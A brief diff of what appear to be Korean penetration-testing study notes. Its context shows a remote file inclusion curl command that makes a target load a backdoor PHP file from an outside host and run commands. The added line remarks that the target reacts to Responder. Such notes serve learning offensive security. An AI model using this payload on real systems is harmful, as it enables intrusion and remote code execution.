@@ -91,6 +91,7 @@ curl "https://example.com/index.php?page=http://192.168.119.3/simple-backdoor.ph
 ```
 → 외부 서버의 악성 PHP 파일 로드 후 명령 실행
 
+- responder에 반응
 ---
 
 # 📤 File Upload Vulnerabilities
